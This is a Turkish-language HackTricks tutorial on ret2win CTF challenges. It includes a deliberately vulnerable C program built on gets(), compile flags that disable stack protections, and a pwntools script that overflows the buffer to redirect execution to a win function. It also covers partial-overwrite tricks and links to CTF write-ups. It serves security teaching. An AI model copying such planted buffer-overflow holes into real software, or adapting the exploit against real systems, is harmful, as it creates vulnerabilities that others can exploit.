# Ret2win

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

**Ret2win** zorlukları, özellikle **binary exploitation** ile ilgili görevlerde, **Capture The Flag (CTF)** yarışmalarında popüler bir kategoridir. Amaç, belirli bir ikili dosyadaki bir açığı kullanarak, genellikle `win`, `flag` gibi bir isimle adlandırılan, çağrılmamış bir fonksiyonu çalıştırmaktır. Bu fonksiyon çalıştırıldığında genellikle bir bayrak veya başarı mesajı yazdırır. Zorluk genellikle, istenen fonksiyona yürütme akışını yönlendirmek için yığın üzerindeki **return address**'i geçersiz kılmayı içerir. İşte daha ayrıntılı bir açıklama ve örnekler: 

### C Örneği

Bir açığı olan basit bir C programını ve çağırmayı amaçladığımız bir `win` fonksiyonunu düşünün:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Bu programı yığın korumaları olmadan ve **ASLR** devre dışı bırakılmış olarak derlemek için aşağıdaki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-m32`: Programı 32-bit ikili olarak derle (bu isteğe bağlıdır ama CTF yarışmalarında yaygındır).
- `-fno-stack-protector`: Yığın taşmalarına karşı korumaları devre dışı bırak.
- `-z execstack`: Yığında kodun çalıştırılmasına izin ver.
- `-no-pie`: `win` fonksiyonunun adresinin değişmemesini sağlamak için Konum Bağımsız İkiliyi devre dışı bırak.
- `-o vulnerable`: Çıktı dosyasının adını `vulnerable` olarak belirle.

### Python Exploit using Pwntools

Exploit için **pwntools** kullanacağız, bu güçlü bir CTF çerçevesidir. Exploit betiği, tamponu taşırmak ve dönüş adresini `win` fonksiyonunun adresi ile değiştirmek için bir yük oluşturacaktır.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` fonksiyonunun adresini bulmak için **gdb**, **objdump** veya ikili dosyaları incelemenizi sağlayan başka bir araç kullanabilirsiniz. Örneğin, `objdump` ile şunu kullanabilirsiniz:
```sh
objdump -d vulnerable | grep win
```
Bu komut, `win` fonksiyonunun montajını, başlangıç adresi de dahil olmak üzere gösterecektir.

Python betiği, `vulnerable_function` tarafından işlendiğinde, tamponu taşıran ve yığın üzerindeki dönüş adresini `win` adresi ile değiştiren dikkatlice hazırlanmış bir mesaj gönderir. `vulnerable_function` döndüğünde, `main`'e veya çıkışa dönmek yerine `win`'e atlar ve mesaj yazdırılır.

## Koruma Önlemleri

- [**PIE**](../../common-binary-protections-and-bypasses/pie/index.html) **devre dışı bırakılmalıdır** ki adres, yürütmeler arasında güvenilir olsun; aksi takdirde fonksiyonun saklanacağı adres her zaman aynı olmayacak ve `win` fonksiyonunun nerede yüklü olduğunu anlamak için bir sızıntıya ihtiyacınız olacak. Bazı durumlarda, taşmaya neden olan fonksiyon `read` veya benzeri olduğunda, dönüş adresini `win` fonksiyonu olacak şekilde değiştirmek için 1 veya 2 baytlık **Kısmi Üst Üste Binen** bir işlem yapabilirsiniz. ASLR'nin çalışma şekli nedeniyle, son üç hex nibble rastgeleleştirilmez, bu nedenle doğru dönüş adresini elde etme olasılığı **1/16** (1 nibble) vardır.
- [**Yığın Kanalları**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) da devre dışı bırakılmalıdır, aksi takdirde tehlikeye atılmış EIP dönüş adresi asla takip edilmeyecektir.

## Diğer örnekler & Referanslar

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
- [https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html](https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html)
- 32bit, ASLR yok
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html)
- 64 bit ASLR ile, bin adresinin sızıntısı ile
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- 64 bit, ASLR yok
- [https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html)
- 32 bit, ASLR yok, çift küçük taşma, ilk taşma yığını taşır ve ikinci taşmanın boyutunu büyütür
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, kanarya yok, nx, pie yok, `fflush` adresini `win` fonksiyonu ile (ret2win) üst üste yazmak için format dizesi
- [https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html)
- 32 bit, nx, başka bir şey yok, `win` fonksiyonunu çağırmak için EIP'nin kısmi üst üste yazılması (1Bayt)
- [https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html)
- 32 bit, nx, başka bir şey yok, `win` fonksiyonunu çağırmak için EIP'nin kısmi üst üste yazılması (1Bayt)
- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Program, bir sayının boyutunu kontrol etmek için yalnızca son baytı doğruluyor, bu nedenle son bayt izin verilen aralıkta olduğu sürece herhangi bir boyut eklemek mümkündür. Ardından, girdi bir tampon taşması oluşturur ve bu taşma bir ret2win ile istismar edilir.
- [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
- 64 bit, relro, kanarya yok, nx, pie. `win` fonksiyonunu çağırmak için kısmi üst üste yazma (ret2win)
- [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
- arm64, PIE, `win` fonksiyonu aslında 2 fonksiyondur, bu nedenle 2 fonksiyonu çağıran ROP gadget
- [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
- ARM64, bir `win` fonksiyonunu çağırmak için bir baytlık taşma

## ARM64 Örneği

{{#ref}}
ret2win-arm64.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
